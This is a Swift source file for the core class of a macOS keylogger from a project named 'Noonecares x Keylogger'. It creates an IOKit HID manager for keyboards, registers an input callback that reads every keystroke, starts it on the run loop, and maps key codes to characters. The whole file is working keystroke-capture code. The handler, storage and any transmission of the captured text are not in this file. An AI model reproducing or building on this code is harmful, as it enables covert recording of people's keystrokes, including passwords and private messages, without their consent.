//
//  Keylogger.swift
//  Noonecares x Keylogger
//
//  Created by Skrew Everything on 14/01/17.
//  Modified by Lesterrry on 24/07/21
//  Copyright © 2017 Skrew Everything, © 2021 Lesterrry. All rights reserved.
//

import Foundation
import IOKit.hid
import Cocoa

class Keylogger
{
    var manager: IOHIDManager
    var deviceList = NSArray()                  // Used in multiple matching dictionary
    
    init()
    {
        // TODO: Sometimes all the thing just stops working until I reboot my Mac
        manager = IOHIDManagerCreate(kCFAllocatorDefault, IOOptionBits(kIOHIDOptionsTypeNone))

        if (CFGetTypeID(manager) != IOHIDManagerGetTypeID())
        {
            SystemMethods.log("Couldn't create manager")
        }
        deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Keyboard)) as NSArray

        IOHIDManagerSetDeviceMatchingMultiple(manager, deviceList as CFArray)
       
        let observer = UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
        
        /* Input value Call Backs */
        IOHIDManagerRegisterInputValueCallback(manager, CallBackFunctions.Handle_IOHIDInputValueCallback, observer);
        
        /* Open HID Manager */
        let ioreturn: IOReturn = openHIDManager()
        if ioreturn != kIOReturnSuccess
        {
            SystemMethods.log("Could't open manager")
        }

    }

    /* For Keyboard */
    func CreateDeviceMatchingDictionary(inUsagePage: Int ,inUsage: Int ) -> CFMutableDictionary
    {    
        let resultAsSwiftDic = [kIOHIDDeviceUsagePageKey: inUsagePage, kIOHIDDeviceUsageKey : inUsage]
        let resultAsCFDic: CFMutableDictionary = resultAsSwiftDic as! CFMutableDictionary
        return resultAsCFDic
    }
    
    func openHIDManager() -> IOReturn
    {
        return IOHIDManagerOpen(manager, IOOptionBits(kIOHIDOptionsTypeNone));
    }
    
    /* Scheduling the HID Loop */
    func start()
    {
        IOHIDManagerScheduleWithRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue)
    }
    
    /* Un-scheduling the HID Loop */
    func stop()
    {
        IOHIDManagerUnscheduleFromRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue);
    }
    
    
    var keyMap: [UInt32:[String]]
    {
        var map = [UInt32:[String]]()
        map[4] =  ["a","A"]
        map[5] =  ["b","B"]
        map[6] =  ["c","C"]
        map[7] =  ["d","D"]
        map[8] =  ["e","E"]
        map[9] =  ["f","F"]
        map[10] = ["g","G"]
        map[11] = ["h","H"]
        map[12] = ["i","I"]
        map[13] = ["j","J"]
        map[14] = ["k","K"]
        map[15] = ["l","L"]
        map[16] = ["m","M"]
        map[17] = ["n","N"]
        map[18] = ["o","O"]
        map[19] = ["p","P"]
        map[20] = ["q","Q"]
        map[21] = ["r","R"]
        map[22] = ["s","S"]
        map[23] = ["t","T"]
        map[24] = ["u","U"]
        map[25] = ["v","V"]
        map[26] = ["w","W"]
        map[27] = ["x","X"]
        map[28] = ["y","Y"]
        map[29] = ["z","Z"]
        map[30] = ["1","!"]
        map[31] = ["2","@"]
        map[32] = ["3","#"]
        map[33] = ["4","$"]
        map[34] = ["5","%"]
        map[35] = ["6","^"]
        map[36] = ["7","&"]
        map[37] = ["8","*"]
        map[38] = ["9","("]
        map[39] = ["0",")"]
        map[44] = [" "," "]
        map[45] = ["-","_"]
        map[46] = ["=","+"]
        map[47] = ["[","{"]
        map[48] = ["]","}"]
        map[50] = ["",""] // Keyboard Non-US# and ~2
        map[51] = [";",":"]
        map[52] = ["'","\""]
        map[54] = [",","<"]
        map[55] = [".",">"]
        // Keypads
        map[85] = ["*","*"]
        map[86] = ["-","-"]
        map[87] = ["+","+"]
        map[89] = ["1",""]
        map[90] = ["2",""]
        map[91] = ["3",""]
        map[92] = ["4",""]
        map[93] = ["5","5"]
        map[94] = ["6",""]
        map[95] = ["7",""]
        map[96] = ["8",""]
        map[97] = ["9",""]
        map[98] = ["0",""]
        return map
    }

}
